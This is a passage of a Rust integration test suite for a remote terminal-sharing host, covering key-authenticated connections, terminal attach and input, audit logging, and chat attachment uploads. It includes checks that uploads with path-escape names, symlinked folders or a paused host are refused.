//! The whole remote path over the in-memory transport: handshake, listing,
//! attaching, output, input, resume, repaint, Pause, and the refusals.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::io;
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant, SystemTime};

use connecto_audit::{Audit, Sink};
use connecto_core::{
    GridSize, InputRefused, PauseSwitch, ResizeOutcome, SessionStatus, SnapshotOutcome,
    TermSnapshot, TerminalSession,
};
use connecto_core::{GuardDenied, RemoteGuard, RemotePeer};
use connecto_gate::Gate;
use connecto_net::auth::{AuthorizedKeySet, KeySigner, Signer};
use connecto_net::client::{ClientError, RemoteClient, RemoteSession};
use connecto_net::host::{
    FixedTerminals, HIDDEN_CHILD_REFUSAL, HostService, HostTerminal, HostTerminals,
    NO_SUCH_PROJECT, Right, RingTap, Target,
};
use connecto_net::seq::Ring;
use connecto_net::transport::loopback::{self, LoopbackConnection};
use connecto_net::transport::{Connection, Stream};
use connecto_net::wire::{DenyReason, ManageOp, Message, ProjectInfo, TerminalAddr};
use connecto_session::RemoteGate;
use connecto_term::Emulator;
use ssh_key::rand_core::OsRng;
use ssh_key::{Algorithm, PrivateKey};

const HOST_ID: [u8; 32] = [0xaa; 32];
const CLIENT_ID: [u8; 32] = [0xbb; 32];

fn key() -> PrivateKey {
    PrivateKey::random(&mut OsRng, Algorithm::Ed25519).unwrap()
}

/// A terminal with no process: an emulator the test writes into, and a record
/// of what was typed.
struct FakeSession {
    emulator: Arc<Emulator>,
    ring: Arc<Ring>,
    typed: Mutex<Vec<u8>>,
    /// Mirrors a real session: `(peer has the size, last local wish)`.
    control: Mutex<(bool, GridSize)>,
    /// How many times the host's view took the size back.
    claims: AtomicU64,
    /// The screen is always busy drawing: no snapshot can be taken.
    busy: AtomicBool,
    /// Stopped: no process and no screen, so its snapshot is 0x0.
    stopped: AtomicBool,
    /// Not started since the host launched: its status is not running.
    never_run: AtomicBool,
    /// The size last applied, as a real session keeps it.
    applied: Mutex<GridSize>,
    /// What peers did, in the order the host acted on it.
    order: Mutex<Vec<&'static str>>,
}

impl FakeSession {
    fn new(ring_bytes: usize) -> Arc<Self> {
        Arc::new(Self {
            emulator: Arc::new(Emulator::new(
                GridSize { cols: 60, rows: 12 },
                Arc::new(|_| {}),
                Arc::new(|| {}),
            )),
            ring: Arc::new(Ring::new(ring_bytes)),
            typed: Mutex::new(Vec::new()),
            control: Mutex::new((false, GridSize { cols: 60, rows: 12 })),
            claims: AtomicU64::new(0),
            busy: AtomicBool::new(false),
            stopped: AtomicBool::new(false),
            never_run: AtomicBool::new(false),
            applied: Mutex::new(GridSize { cols: 60, rows: 12 }),
            order: Mutex::new(Vec::new()),
        })
    }

    fn apply(&self, size: GridSize) -> ResizeOutcome {
        let outcome = self.emulator.try_resize(size);
        if outcome == ResizeOutcome::Applied {
            *self.applied.lock().unwrap() = size;
        }
        outcome
    }

    /// Output from the "process", through the same tap a real session uses.
    fn print(&self, bytes: &[u8]) {
        use connecto_core::OutputTap;
        RingTap::recording(Arc::clone(&self.ring)).feed(bytes, &mut |b| self.emulator.feed(b));
    }

    fn typed(&self) -> Vec<u8> {
        self.typed.lock().unwrap().clone()
    }
}

impl TerminalSession for FakeSession {
    fn chat_history(&self) -> Option<Arc<connecto_core::session::ChatHistory>> {
        Some(Arc::new(connecto_core::session::ChatHistory {
            revision: 2,
            messages: vec![(true, "hello".into()), (false, "answer".into())],
        }))
    }
    fn poll_snapshot(&self, out: &mut TermSnapshot) -> SnapshotOutcome {
        if self.busy.load(Ordering::SeqCst) {
            return SnapshotOutcome::Contended;
        }
        if self.stopped.load(Ordering::SeqCst) {
            *out = TermSnapshot::default();
            return SnapshotOutcome::Updated;
        }
        self.emulator.poll_snapshot(out)
    }
    fn send_input(&self, bytes: Vec<u8>) -> Result<(), InputRefused> {
        self.order.lock().unwrap().push("input");
        self.typed.lock().unwrap().extend(bytes);
        Ok(())
    }
    /// The condition is the voice tests' (voice_answers) to check; here
    /// only who may write is.
    fn send_input_if(
        &self,
        _: &connecto_core::InputCondition,
        bytes: Vec<u8>,
    ) -> Result<(), InputRefused> {
        self.send_input(bytes)
    }
    fn resize(&self, size: GridSize) -> ResizeOutcome {
        let mut control = self.control.lock().unwrap();
        control.1 = size;
        if control.0 {
            return ResizeOutcome::Applied;
        }
        self.apply(size)
    }
    fn resize_remote(&self, size: GridSize) -> ResizeOutcome {
        let outcome = self.apply(size);
        if outcome == ResizeOutcome::Applied {
            self.order.lock().unwrap().push("resize");
        }
        outcome
    }
    fn set_remote_size_control(&self, on: bool) {
        let local = {
            let mut control = self.control.lock().unwrap();
            control.0 = on;
            control.1
        };
        if !on {
            // As a real session does, retry while the emulator is busy.
            for _ in 0..200 {
                if self.apply(local) != ResizeOutcome::Retry {
                    break;
                }
                thread::sleep(Duration::from_millis(1));
            }
        }
    }
    fn claim_local_size(&self) {
        let local = {
            let mut control = self.control.lock().unwrap();
            if !control.0 {
                return;
            }
            control.0 = false;
            self.claims.fetch_add(1, Ordering::SeqCst);
            control.1
        };
        for _ in 0..200 {
            if self.apply(local) != ResizeOutcome::Retry {
                break;
            }
            thread::sleep(Duration::from_millis(1));
        }
    }
    fn applied_size(&self) -> Option<GridSize> {
        Some(*self.applied.lock().unwrap())
    }
    fn local_size_claims(&self) -> u64 {
        self.claims.load(Ordering::SeqCst)
    }
    fn scroll(&self, lines: i32) -> bool {
        self.emulator.try_scroll(lines)
    }
    fn poll_capture(
        &self,
        max_cells: usize,
        flush: bool,
        screen: &mut TermSnapshot,
        history: &mut TermSnapshot,
    ) -> SnapshotOutcome {
        if self.emulator.try_capture(max_cells, flush, screen, history) {
            SnapshotOutcome::Updated
        } else {
            SnapshotOutcome::Contended
        }
    }
    fn status(&self) -> SessionStatus {
        if self.never_run.load(Ordering::SeqCst) {
            SessionStatus::Unknown {
                reason: "not started".into(),
            }
        } else {
            SessionStatus::Running
        }
    }
}

#[derive(Clone, Default)]
struct Lines(Arc<Mutex<Vec<String>>>);

impl Sink for Lines {
    fn write_line(&mut self, line: &str) -> io::Result<()> {
        self.0.lock().unwrap().push(line.to_owned());
        Ok(())
    }
}

/// The host's terminals, with a record of what peers asked to do to them.
/// A Siri ask's caller, and how its paste and its Enter went.
type SiriTyped = (String, Result<(), String>, Result<(), String>);
/// A voice answer's writes through the peer's caller: whether terminal 1
/// and an unlisted 99 were granted, then a write to 1, one to 99, and one to
/// 1 after `between` ran.
type VoiceTyped = (
    (bool, bool),
    Result<(), String>,
    Result<(), String>,
    Result<(), String>,
);

struct Managed {
    attachment_root: tempfile::TempDir,
    inner: FixedTerminals,
    ops: Mutex<Vec<ManageOp>>,
    refuse: Mutex<Option<String>>,
    /// Projects with no terminal yet, after the ones the terminals name.
    empty: Mutex<Vec<ProjectInfo>>,
    /// Runs after the host checked the right and before the registry acts: a
    /// local change landing in that window.
    between: Mutex<Option<Box<dyn FnOnce() + Send>>>,
    /// The conversation model peers may ask; none by default.
    assistant: Mutex<Option<connecto_net::assistant::AssistantConfig>>,
    /// Jev's turn verdict, faked: none means no key. Each text asked is
    /// kept, with its context and wait.
    turn: Mutex<Option<connecto_net::wire::TurnScores>>,
    turns_asked: Mutex<Vec<(String, String, Duration)>>,
    /// What peers asked of the projects, with the project each named.
    asks: Mutex<Vec<(String, connecto_net::project_panels::ProjectAsk)>>,
    /// Each Siri ask's caller as the host gave it, and how its two writes
    /// (paste, Enter) went.
    siri_typed: Mutex<Vec<SiriTyped>>,
    voice_typed: Mutex<Vec<VoiceTyped>>,
    /// Files offered with `connecto send-file`, and where each is.
    offered: Mutex<Vec<(connecto_net::wire::OfferInfo, std::path::PathBuf)>>,
    /// The project's operations, as files in a folder of their own.
    project_ops: Arc<FolderOps>,
    /// The person's secrets, as the app keeps them (in memory here).
    vault: Arc<connecto_vault::Vault>,
}

/// A project's operations as the app keeps them: files in
/// `.connecto/ops/<slug>/` and an approval that is the hash of the files the
/// person was shown, checked against the files on disk at each approval and
/// run, as the app's `OpsHost` checks it.
struct FolderOps {
    project: tempfile::TempDir,
    state: Mutex<connecto_ops::State>,
    /// What ran: the operation and its arguments.
    runs: Mutex<Vec<(String, Vec<String>)>>,
}

impl FolderOps {
    fn new() -> Self {
        Self {
            project: tempfile::tempdir().unwrap(),
            state: Mutex::new(connecto_ops::State::new(1)),
            runs: Mutex::new(Vec::new()),
        }
    }

    fn write(&self, slug: &str, spec: &str, body: &str) {
        let dir = connecto_ops::folder::ops_dir(self.project.path()).join(slug);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("op.json"), spec).unwrap();
        std::fs::write(dir.join("run.sh"), body).unwrap();
    }

    fn on_disk(&self, slug: &str) -> String {
        connecto_ops::folder::load(self.project.path(), slug)
            .unwrap()
            .hash
    }
}

impl connecto_core::ops::OpsControl for FolderOps {
    fn view(&self, project: &str) -> connecto_core::ops::OpsView {
        let state = self.state.lock().unwrap();
        connecto_core::ops::OpsView {
            project: project.to_owned(),
            available: true,
            ops: connecto_ops::rows(
                &connecto_ops::folder::scan(self.project.path()),
                &state,
                &[],
                &[],
            ),
            hook: state.hook,
            weekly: state.weekly,
            ..connecto_core::ops::OpsView::default()
        }
    }

    fn submit(&self, _project: String, _action: connecto_core::ops::OpsAction) {
        panic!("a peer's action is done at once, never submitted");
    }

    fn act(&self, _project: &str, action: connecto_core::ops::OpsAction) -> Result<String, String> {
        use connecto_core::ops::OpsAction;
        let load = |slug: &str, hash: &str| {
            let loaded = connecto_ops::folder::load(self.project.path(), slug)?;
            if loaded.hash == hash {
                Ok(loaded)
            } else {
                Err(format!("{slug} changed since it was shown."))
            }
        };
        let mut state = self.state.lock().unwrap();
        match action {
            OpsAction::Approve { slug, hash } => {
                load(&slug, &hash)?;
                state.approved.insert(slug.clone(), hash);
                Ok(format!("Approved {slug}."))
            }
            OpsAction::Run { slug, hash, args } => {
                load(&slug, &hash)?;
                if state.approved.get(&slug) != Some(&hash) {
                    return Err(format!("Approve {slug} before running it."));
                }
                self.runs.lock().unwrap().push((slug.clone(), args));
                Ok(format!("{slug} is running."))
            }
            OpsAction::SetHook(mode) => {
                state.hook = mode;
                Ok("Set.".into())
            }
            OpsAction::SetWeekly(on) => {
                state.weekly = on;
                Ok("Set.".into())
            }
            other => Err(format!("not in this test: {other:?}")),
        }
    }
}

impl HostTerminals for Managed {
    fn groups(&self) -> connecto_core::RemoteGroups {
        connecto_core::RemoteGroups {
            groups: vec![
                connecto_core::ProjectGroup {
                    id: "group-2".into(),
                    name: "HARBOR".into(),
                },
                connecto_core::ProjectGroup {
                    id: "group-1".into(),
                    name: "Other".into(),
                },
            ],
            of: vec![
                ("p".into(), "group-2".into()),
                ("q".into(), "group-1".into()),
            ],
        }
    }

    fn secret_asks(&self) -> Vec<connecto_core::SecretAsk> {
        connecto_core::VaultControl::view(&*self.vault).asks.clone()
    }

    fn offers(&self) -> Vec<connecto_net::wire::OfferInfo> {
        self.offered
            .lock()
            .unwrap()
            .iter()
            .map(|(o, _)| o.clone())
            .collect()
    }

    fn open_offer(&self, id: u64) -> Result<(String, std::fs::File), String> {
        let offered = self.offered.lock().unwrap();
        let (offer, path) = offered
            .iter()
            .find(|(o, _)| o.id == id)
            .ok_or(connecto_net::host::NO_SUCH_OFFER)?;
        Ok((offer.name.clone(), std::fs::File::open(path).unwrap()))
    }

    /// A Siri ask types as the peer: the paste, then whatever runs in
    /// `between`, then the Enter, both through the host's caller.
    fn project_ask_by(
        &self,
        right: &Right,
        ask: &connecto_net::project_panels::ProjectAsk,
        caller: &dyn connecto_net::siri::SiriCaller,
    ) -> Result<Vec<u8>, String> {
        if let connecto_net::project_panels::ProjectAsk::QuestionAnswer { terminal, .. } = ask {
            let session = self.inner.0.lock().unwrap()[0].session.clone();
            let entry = connecto_core::TerminalEntry {
                id: "claude-1".into(),
                name: None,
                parent: None,
                asked_by: None,
                tool: connecto_core::ToolKind::Claude,
                state: connecto_core::TermActivity::NeedsUser,
                in_turn: true,
                background: Vec::new(),
                finished_turns: 0,
                session,
                control: None,
                desired_running: true,
                shown_id: None,
                activity: 0,
            };
            let granted = (caller.granted(*terminal), caller.granted(99));
            let any = connecto_core::InputCondition::default();
            let first = caller.type_now(&entry, *terminal, &any, b"\x1b[B".to_vec());
            let unlisted = caller.type_now(&entry, 99, &any, b"\r".to_vec());
            if let Some(between) = self.between.lock().unwrap().take() {
                between();
            }
            let after = caller.type_now(&entry, *terminal, &any, b"\r".to_vec());
            self.voice_typed
                .lock()
                .unwrap()
                .push((granted, first, unlisted, after));
        } else if let connecto_net::project_panels::ProjectAsk::Questions = ask {
            // Collected while terminal 1 is the peer's; `between` may take
            // it away before the answer is delivered.
            if let Some(between) = self.between.lock().unwrap().take() {
                between();
            }
            return Ok(serde_json::json!({
                "questions": [{"terminal": 1, "prompt": "$ secret-command"}],
            })
            .to_string()
            .into_bytes());
        } else if let connecto_net::project_panels::ProjectAsk::SiriAsk { text, .. } = ask {
            let session = self.inner.0.lock().unwrap()[0].session.clone();
            let entry = connecto_core::TerminalEntry {
                id: "claude-1".into(),
                name: Some(connecto_core::session::APP_SESSION.into()),
                parent: None,
                asked_by: None,
                tool: connecto_core::ToolKind::Claude,
                state: connecto_core::TermActivity::Idle,
                in_turn: false,
                background: Vec::new(),
                finished_turns: 0,
                session,
                control: None,
                desired_running: true,
                shown_id: None,
                activity: 0,
            };
            let paste = caller.type_into(&entry, text.as_bytes().to_vec());
            if let Some(between) = self.between.lock().unwrap().take() {
                between();
            }
            let enter = caller.type_into(&entry, vec![13]);
            self.siri_typed
                .lock()
                .unwrap()
                .push((caller.owner().to_owned(), paste, enter));
        } else if let Some(between) = self.between.lock().unwrap().take() {
            // A host that stalls before it answers.
            between();
        }
        self.project_ask(right, ask)
    }

    /// One closed terminal, and a transcript long enough to come in chunks.
    fn project_ask(
        &self,
        right: &Right,
        ask: &connecto_net::project_panels::ProjectAsk,
    ) -> Result<Vec<u8>, String> {
        use connecto_net::project_panels::{self as panels, ProjectAsk};
        let Target::Project(project) = right.target() else {
            return Err("not a project".into());
        };
        self.asks
            .lock()
            .unwrap()
            .push((project.clone(), ask.clone()));
        match ask {
            ProjectAsk::History => Ok(panels::history_json(&[connecto_core::HistoryEntry {
                id: "h1".into(),
                terminal_id: "4".into(),
                name: Some("old build".into()),
                tool: connecto_core::ToolKind::Claude,
                parent: None,
                closed_at_ms: 1,
                task: Some("fix it".into()),
                last_reply: None,
                resumable: true,
            }])),
            ProjectAsk::Transcript { history } if history == "h1" => {
                Ok(panels::transcript_json(history, &"line\n".repeat(60_000)))
            }
            ProjectAsk::Transcript { .. } => Err("no such closed terminal".into()),
            ProjectAsk::Ops { .. } | ProjectAsk::OpsAct(_) => {
                connecto_net::hosting::answer_ops(&*self.project_ops, project, ask)
            }
            ProjectAsk::Secrets { .. } | ProjectAsk::SecretsAct(_) => {
                connecto_net::remote_secrets::answer_secrets(&*self.vault, project, "Project", ask)
            }
            _ => Ok(panels::done_json()),
        }
    }

    fn complete(&self, request: &connecto_net::wire::Completion) -> Result<String, String> {
        let config = self
            .assistant
            .lock()
            .unwrap()
            .clone()
            .ok_or(connecto_net::assistant::NOT_SET_UP)?;
        connecto_net::assistant::complete(
            &config,
            request,
            Duration::from_millis(u64::from(request.wait_ms)),
        )
    }

    fn judge_turn(
        &self,
        text: &str,
        context: &str,
        wait: Duration,
    ) -> Result<connecto_net::wire::TurnScores, connecto_net::wire::TurnVerdict> {
        self.turns_asked
            .lock()
            .unwrap()
            .push((text.to_owned(), context.to_owned(), wait));
        self.turn.lock().unwrap().ok_or_else(|| {
            connecto_net::wire::TurnVerdict::Unavailable(connecto_net::wire::NO_TURN_JUDGE.into())
        })
    }

    fn attachment_root(&self) -> Option<&std::path::Path> {
        Some(self.attachment_root.path())
    }

    fn list(&self) -> Vec<HostTerminal> {
        self.inner.list()
    }
    fn projects(&self) -> Vec<ProjectInfo> {
        let mut out: Vec<ProjectInfo> = Vec::new();
        for term in self.inner.list() {
            if !out.iter().any(|p| p.id == term.project_id) {
                out.push(ProjectInfo {
                    id: term.project_id,
                    name: term.project_name,
                });
            }
        }
        for project in self.empty.lock().unwrap().iter() {
            if !out.iter().any(|p| p.id == project.id) {
                out.push(project.clone());
            }
        }
        out
    }
    fn active_project(&self) -> Option<String> {
        Some("p".to_owned())
    }
    /// A path relative to the upload folder, which stands for the project's.
    fn open_file(&self, _right: &Right, path: &str) -> Result<(String, std::fs::File), String> {
        let file = self.attachment_root.path().join(path);
        std::fs::File::open(&file)
            .map(|opened| (file.display().to_string(), opened))
            .map_err(|_| "no such file on that machine".to_owned())
    }
    fn close_within(&self, right: &Right, listed: &[u32]) -> Result<Option<u32>, String> {
        let between = self.between.lock().unwrap().take();
        if let Some(local) = between {
            local();
        }
        let Target::Terminal { id, project } = right.target() else {
            return Err(DenyReason::NoSuchTerminal.to_string());
        };
        // The subtree is worked out now, from the list as it is, and checked
        // against what the peer was sent. Nothing is closed unless all of it is.
        let list = self.inner.0.lock().unwrap();
        if !list.iter().any(|t| t.id == *id && &t.project_id == project) {
            return Err(DenyReason::NoSuchTerminal.to_string());
        }
        let mut subtree = vec![*id];
        let mut at = 0;
        while at < subtree.len() {
            let parent = subtree[at];
            for term in list.iter().filter(|t| t.parent == Some(parent)) {
                if !subtree.contains(&term.id) {
                    subtree.push(term.id);
                }
            }
            at += 1;
        }
        if subtree.iter().any(|wire| !listed.contains(wire)) {
            return Err(connecto_net::host::HIDDEN_CHILD_REFUSAL.to_owned());
        }
        if let Some(why) = self.refuse.lock().unwrap().clone() {
            return Err(why);
        }
        self.ops
            .lock()
            .unwrap()
            .push(ManageOp::Close { terminal: *id });
        Ok(None)
    }
    fn manage(&self, op: &ManageOp, right: &Right) -> Result<Option<u32>, String> {
        let between = self.between.lock().unwrap().take();
        if let Some(local) = between {
            local();
        }
        // The check and the action share one lock: the list cannot change
        // between them.
        let list = self.inner.0.lock().unwrap();
        let held = match right.target() {
            Target::Terminal { id, project } => {
                list.iter().any(|t| t.id == *id && t.project_id == *project)
            }
            Target::Project(project) => {
                list.iter().any(|t| t.project_id == *project)
                    || self.empty.lock().unwrap().iter().any(|p| p.id == *project)
            }
        };
        if !held {
            return Err(match right.target() {
                Target::Terminal { .. } => DenyReason::NoSuchTerminal.to_string(),
                Target::Project(_) => NO_SUCH_PROJECT.to_owned(),
            });
        }
        self.ops.lock().unwrap().push(op.clone());
        if let Some(why) = self.refuse.lock().unwrap().clone() {
            return Err(why);
        }
        Ok(matches!(op, ManageOp::Add { .. }).then_some(99))
    }
}

struct Rig {
    managed: Arc<Managed>,
    host: Arc<HostService>,
    guard: Arc<RemoteGate>,
    pause: Arc<PauseSwitch>,
    gate: Arc<Gate>,
    log: Lines,
    session: Arc<FakeSession>,
    allowed: PrivateKey,
}

impl Rig {
    fn new(ring_bytes: usize) -> Self {
        let session = FakeSession::new(ring_bytes);
        let list = vec![HostTerminal {
            entry: None,
            ran: true,
            owner: None,
            background: Vec::new(),
            id: 7,
            name: "claude-1".into(),
            tool: 1,
            project_id: "p".into(),
            project_name: "Project".into(),
            parent: None,
            attempt: 1,
            activity: 0,
            session: Arc::clone(&session) as Arc<dyn TerminalSession>,
            ring: Arc::clone(&session.ring),
        }];
        Self::with_list(list, session)
    }

    /// A host whose terminals are `list`; `session` is the one the screen
    /// helpers read.
    fn with_list(list: Vec<HostTerminal>, session: Arc<FakeSession>) -> Self {
        let allowed = key();
        let log = Lines::default();
        let pause = Arc::new(PauseSwitch::default());
        let gate = Arc::new(Gate::new(
            Arc::clone(&pause),
            Audit::with_sink(log.clone()).unwrap(),
            "TEST",
        ));
        let guard = Arc::new(RemoteGate::with_gate(Arc::clone(&gate)));
        guard.set_enabled(true);
        let terminals = Arc::new(Managed {
            attachment_root: tempfile::tempdir().unwrap(),
            ops: Mutex::new(Vec::new()),
            refuse: Mutex::new(None),
            inner: FixedTerminals(Mutex::new(list)),
            empty: Mutex::new(Vec::new()),
            between: Mutex::new(None),
            assistant: Mutex::new(None),
            turn: Mutex::new(None),
            turns_asked: Mutex::new(Vec::new()),
            asks: Mutex::new(Vec::new()),
            siri_typed: Mutex::new(Vec::new()),
            voice_typed: Mutex::new(Vec::new()),
            offered: Mutex::new(Vec::new()),
            project_ops: Arc::new(FolderOps::new()),
            vault: Arc::new(connecto_vault::Vault::open(
                Arc::new(connecto_secrets::Secrets::new(
                    Arc::new(connecto_secrets::MemoryItems::default()),
                    None,
                )),
                Arc::new(connecto_vault::FixedKey([3; 32])),
                None,
            )),
        });
        let text = format!("{}\n", allowed.public_key().to_openssh().unwrap());
        let keys = Arc::new(AuthorizedKeySet::parse(&text).unwrap());
        let host = Arc::new(HostService::new(
            Arc::clone(&terminals) as Arc<dyn HostTerminals>,
            Arc::new(move || Arc::clone(&keys)),
            Arc::clone(&guard) as Arc<dyn RemoteGuard>,
        ));
        Self {
            managed: terminals,
            host,
            guard,
            pause,
            gate,
            log,
            session,
            allowed,
        }
    }

    /// A new connection with the host serving its end on a thread.
    fn connect(&self, binding: u8) -> (Arc<LoopbackConnection>, thread::JoinHandle<()>) {
        let (client, host) = loopback::pair(CLIENT_ID, HOST_ID, [binding; 32]);
        let service = Arc::clone(&self.host);
        let handle = thread::spawn(move || service.serve(&host));
        (Arc::new(client), handle)
    }

    /// A connected client and its connection. It takes the host's list when
    /// `list` is set, as the supervisor does before it attaches or manages
    /// anything. Retries while the host still serves an earlier peer.
    fn connect_as(&self, list: bool) -> (RemoteClient, Arc<LoopbackConnection>) {
        let deadline = Instant::now() + Duration::from_secs(10);
        loop {
            let (conn, _handle) = self.connect(1);
            let attempt = RemoteClient::connect(
                Arc::clone(&conn) as Arc<dyn Connection>,
                "build-box",
                &HOST_ID,
                &self.signer(),
            );
            match attempt {
                Ok(client) => {
                    if list {
                        client.listing().unwrap();
                    }
                    return (client, conn);
                }
                Err(ClientError::Denied(DenyReason::Busy)) if Instant::now() < deadline => {
                    thread::sleep(Duration::from_millis(5));
                }
                Err(err) => panic!("{err}"),
            }
        }
    }

    /// A connected client that has taken the host's list, as the supervisor
    /// does before it attaches or manages anything.
    fn client(&self, signer: &dyn Signer) -> Result<RemoteClient, ClientError> {
        let (conn, _handle) = self.connect(1);
        let client = RemoteClient::connect(conn, "build-box", &HOST_ID, signer)?;
        client.list()?;
        Ok(client)
    }

    fn signer(&self) -> KeySigner {
        KeySigner(self.allowed.clone())
    }

    fn audit(&self) -> String {
        assert!(self.gate.flush(Duration::from_secs(2)));
        self.log.0.lock().unwrap().join("\n")
    }
}

fn text(snapshot: &TermSnapshot) -> String {
    (0..snapshot.rows)
        .map(|row| {
            let line: String = snapshot.row(row).iter().map(|c| c.ch).collect();
            line.trim_end().to_owned()
        })
        .collect::<Vec<_>>()
        .join("\n")
}

fn wait_until(what: &str, mut ok: impl FnMut() -> bool) {
    let deadline = Instant::now() + Duration::from_secs(10);
    while Instant::now() < deadline {
        if ok() {
            return;
        }
        thread::sleep(Duration::from_millis(5));
    }
    panic!("timed out waiting for {what}");
}

fn screen(session: &dyn TerminalSession) -> TermSnapshot {
    let mut snap = TermSnapshot::default();
    for _ in 0..100 {
        if session.poll_snapshot(&mut snap) == SnapshotOutcome::Updated {
            break;
        }
        thread::sleep(Duration::from_millis(2));
    }
    snap
}

fn wait_for_text(session: &dyn TerminalSession, needle: &str) {
    wait_until(needle, || text(&screen(session)).contains(needle));
}

/// A new client, once the host has a place free.
fn reconnect(rig: &Rig) -> RemoteClient {
    let deadline = Instant::now() + Duration::from_secs(10);
    loop {
        match rig.client(&rig.signer()) {
            Ok(client) => return client,
            Err(ClientError::Denied(DenyReason::Busy)) if Instant::now() < deadline => {
                thread::sleep(Duration::from_millis(5));
            }
            Err(err) => panic!("{err}"),
        }
    }
}

fn attach(client: &RemoteClient) -> Arc<RemoteSession> {
    let session = RemoteSession::new(
        TerminalAddr {
            host: client.host().to_owned(),
            terminal: 7,
        },
        GridSize { cols: 60, rows: 12 },
        Arc::new(|| {}),
    );
    session.attach(client, 7).unwrap();
    session
}

/// The visible screens match, cell for cell.
fn assert_screens_equal(a: &dyn TerminalSession, b: &dyn TerminalSession) {
    let (a, b) = (screen(a), screen(b));
    assert_eq!(text(&a), text(&b));
    for row in 0..a.rows {
        assert_eq!(a.row(row), b.row(row), "row {row}");
    }
}

#[test]
fn a_peer_with_an_allowed_key_lists_attaches_sees_output_and_types() {
    let rig = Rig::new(1 << 20);
    rig.session.print(b"before attach\r\n");
    let client = rig.client(&rig.signer()).unwrap();
    let list = client.list().unwrap();
    assert_eq!(list.len(), 1);
    // Terminals are addressed by host name and the host's own id.
    assert_eq!(list[0].0.host, "build-box");
    assert_eq!(list[0].0.terminal, 7);
    assert_eq!(list[0].1.name, "claude-1");
    assert!(list[0].1.running);

    let remote = attach(&client);
    // What was already on screen arrives as a repaint.
    wait_for_text(&*remote, "before attach");
    rig.session.print(b"live output\r\n");
    wait_for_text(&*remote, "live output");
    assert_screens_equal(&*rig.session, &*remote);

    remote.send_input(b"ls -l\r".to_vec()).unwrap();
    wait_until("typed bytes at the host", || {
        rig.session.typed() == b"ls -l\r"
    });
    let log = rig.audit();
    assert!(log.contains("\"actor\":\"remote\""), "{log}");
    assert!(log.contains("\"action\":\"attach\""));
    assert!(log.contains("\"action\":\"connect\""));
    client.close();
}

#[test]
fn chat_history_arrives_on_the_authenticated_terminal_stream() {
    let rig = Rig::new(4096);
    rig.managed.inner.0.lock().unwrap()[0].name = connecto_core::session::APP_SESSION.into();
    rig.session.print(b"hidden tool output");
    let client = rig.client(&rig.signer()).unwrap();
    client.list().unwrap();
    let remote = attach(&client);
    wait_until("chat snapshot", || {
        remote.chat_history().is_some_and(|history| {
            history.messages == vec![(true, "hello".into()), (false, "answer".into())]
        })
    });
    client.close();
}

#[test]
fn chat_attachments_use_the_authenticated_project_and_reuse_the_host_path_on_retry() {
    let rig = Rig::new(4096);
    let client = rig.client(&rig.signer()).unwrap();
    client.list().unwrap();
    let normal = attach(&client);
    assert!(!normal.chat_attachments_supported());
    assert!(
        normal
            .upload_chat_attachment("p", &"a".repeat(32), "notes.txt", b"x")
            .is_err()
    );
    rig.managed.inner.0.lock().unwrap()[0].name = connecto_core::session::APP_SESSION.into();
    let client_listing = client.list().unwrap();
    assert_eq!(client_listing[0].1.name, "app-session");
    let remote = attach(&client);
    wait_until("chat snapshot", || remote.chat_history().is_some());
    wait_until("attachment support", || remote.chat_attachments_supported());

    let bytes = (0_u8..=255).cycle().take(150_000).collect::<Vec<_>>();
    let token = "a".repeat(32);
    let path = remote
        .upload_chat_attachment("p", &token, "notes.txt", &bytes)
        .unwrap();
    let folder = rig
        .managed
        .attachment_root
        .path()
        .join("chat-attachments")
        .join("p");
    assert!(std::path::Path::new(&path).starts_with(&folder), "{path}");
    assert_eq!(std::fs::read(&path).unwrap(), bytes);
    assert_eq!(
        remote
            .upload_chat_attachment("p", &token, "notes.txt", &bytes)
            .unwrap(),
        path
    );
    assert_eq!(std::fs::read_dir(&folder).unwrap().count(), 1);

    assert!(
        remote
            .upload_chat_attachment("p", &token, "notes.txt", b"different")
            .is_err()
    );
    assert!(
        remote
            .upload_chat_attachment("p", &token, "other.txt", b"different")
            .is_err()
    );

    let other = "b".repeat(32);
    assert!(
        remote
            .upload_chat_attachment("other-project", &other, "notes.txt", b"x")
            .is_err()
    );
    assert!(
        remote
            .upload_chat_attachment("p", &other, "../notes.txt", b"x")
            .is_err()
    );
    rig.pause.pause();
    assert!(
        remote
            .upload_chat_attachment("p", &other, "notes.txt", b"x")
            .unwrap_err()
            .contains("paused")
    );
    assert_eq!(std::fs::read_dir(&folder).unwrap().count(), 1);
    rig.pause.resume();
    let other_path = remote
        .upload_chat_attachment("p", &other, "notes.txt", b"x")
        .unwrap();
    assert_ne!(path, other_path);
    assert_eq!(std::fs::read(other_path).unwrap(), b"x");
    assert_eq!(std::fs::read(path).unwrap(), bytes);
    client.close();
}

#[test]
fn an_antigravity_project_chat_takes_attachments_and_a_shell_does_not() {
    let rig = Rig::new(4096);
    {
        let mut list = rig.managed.inner.0.lock().unwrap();
        list[0].name = connecto_core::session::APP_SESSION.into();
        list[0].tool = 5;
    }
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    wait_until("chat snapshot", || remote.chat_history().is_some());
    wait_until("attachment support", || remote.chat_attachments_supported());
    let path = remote
        .upload_chat_attachment("p", &"c".repeat(32), "shot.png", b"png")
        .unwrap();
    assert_eq!(std::fs::read(path).unwrap(), b"png");

    // The same app session as a shell, listed again: no files.
    rig.managed.inner.0.lock().unwrap()[0].tool = 3;
    client.list().unwrap();
    let shell = attach(&client);
    wait_until("chat snapshot", || shell.chat_history().is_some());
    std::thread::sleep(Duration::from_millis(300));
    assert!(!shell.chat_attachments_supported());
    client.close();
}

#[cfg(unix)]
#[test]
fn a_symlink_at_the_project_upload_directory_refuses_the_attachment() {
    let rig = Rig::new(4096);
    rig.managed.inner.0.lock().unwrap()[0].name = connecto_core::session::APP_SESSION.into();
    let folder = rig.managed.attachment_root.path().join("chat-attachments");
    std::fs::create_dir(&folder).unwrap();
    let outside = tempfile::tempdir().unwrap();
    std::os::unix::fs::symlink(outside.path(), folder.join("p")).unwrap();
    let client = rig.client(&rig.signer()).unwrap();
    client.list().unwrap();
    let remote = attach(&client);
    wait_until("chat snapshot", || remote.chat_history().is_some());
    wait_until("attachment support", || remote.chat_attachments_supported());
    assert!(
        remote
            .upload_chat_attachment("p", &"a".repeat(32), "notes.txt", b"x")
            .is_err()
    );
    assert_eq!(std::fs::read_dir(outside.path()).unwrap().count(), 0);
    client.close();
